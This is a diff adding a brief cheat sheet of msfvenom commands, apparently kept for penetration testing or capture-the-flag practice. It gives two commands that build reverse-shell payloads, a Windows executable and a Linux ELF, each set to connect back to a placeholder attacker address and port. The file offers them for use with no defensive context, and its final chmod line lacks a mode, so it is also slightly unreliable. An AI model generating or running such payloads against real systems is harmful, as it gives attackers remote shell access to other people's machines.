@@ -1,0 +1,7 @@
+for all things msfvenom
+windows:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=<port> -f exe -O rev.exe
+
+Linux:
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your_ip> LPORT=<port> -f elf -o shell.elf
+chmod shell.elf
